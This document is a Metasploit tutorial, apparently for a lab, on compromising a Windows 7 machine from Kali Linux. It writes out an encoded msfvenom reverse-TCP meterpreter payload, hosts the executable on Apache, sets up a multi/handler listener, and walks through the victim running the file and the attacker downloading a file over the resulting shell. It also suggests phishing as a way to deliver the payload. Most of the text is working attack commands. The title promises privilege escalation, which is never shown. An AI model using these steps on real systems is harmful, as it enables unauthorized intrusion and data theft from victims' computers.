# Privilege Escalation using Metasploit

In our demonstration here, we will be using Kali Linux to attack a Windows 7 box.

## Tutorial Video

![Exe Attack](./images/exe_attack.png)

## Steps

### Step 1: Creating the executable with Msfvenom

First we will create a simple payload using MSFvenom and save it as an executable to be run on the target. Run below command to create the executable.

```bash
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 LHOST=192.168.1.26 LPORT=443 -e x86/shikata_ga_nai -i 15 -f exe -o msf_attack.exe
```

- `-p`: Payload which needs to be delivered in the exploit. We have used **windows/meterpreter/reverse_tcp** the payload is staged and will connect back to our handler to deliver the complete meterpreter payload.
- `--platform`: Platform for which exploit is developed. We have used **windows** as our platform.
- `-a`: Architecture of exploit is **x86** works with both 32 and 64-bitt windows and better than **x64**.
- `LHOST`: Host to which exploit will connect. We are using our local IP here. Use `ifconfig` to get it.
- `LPORT`: Port to which exploit will connect. We are using 443 to avoid windows firewall issue.
- `-e`: Encoder of exploit. We see the most success using **x86/shikata_ga_nai** with several iterations.
- `-i`: Iteration of the encoder. No of iteration for encoder **15** works fine
- `-f`: Output format of the exploit.
- `-o`: Output path of exploit.

### Step 2: Serving executable with apache server

We'll use an HTTP server to host our file, so all the victim has to do is connect to us, download the file, and run it. In the real world, this could be accomplished in any number of ways, including social engineering or a phishing attack. For now, though, we will keep it simple. First we'll copy executable to `/var/www/html` than we'll start our apache server.

```bash
$ cp msf_attack.exe /var/www/html/msf_attack.exe
$ service apache2 start
```

### Step 3: Starting a Meterpreter handler

On our attacking system, we'll now create a handler to accept incoming connections from our payload. We should ensure the IP and port are the same as used in previous steps:

```bash
$ service postgresql start
$ msfconsole
msf5 > use multi/handler
msf5 exploit(multi/handler)> set PAYLOAD windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler)> set LHOST 192.168.1.26
msf5 exploit(multi/handler)> set LPORT 443
msf5 exploit(multi/handler)> exploit -j
```

So we have the reverse TCP handler listening on port 443 for any incoming connections. Now we just need to get the files we generated earlier onto the Windows 7 machine.

### Step 4: Downloading file on victim computer

On the target, browse to the url(`/msf_attack.exe`) with IP address of the attacking machine and download the file.

`http://192.168.1.26/msf_attack.exe`

Then, simply save it and run it and we have a reverse connection to the Windows 7 machine from the Kali Linux command line.

### Step 5: Privilege Escalation

We have a Meterpreter session established back on our handler. So letâ€™s see what we can do with full control.

```bash
msterpreter> help
```

Now we'll download video file from videos folder as a proof.

```bash
msterpreter> cd ..
msterpreter> cd Videos
msterpreter> download ./Wildlife.wmv
```

File will be dowload to our home folder we can further play it.

### References

- https://null-byte.wonderhowto.com/how-to/bypass-uac-escalate-privileges-windows-using-metasploit-0196076/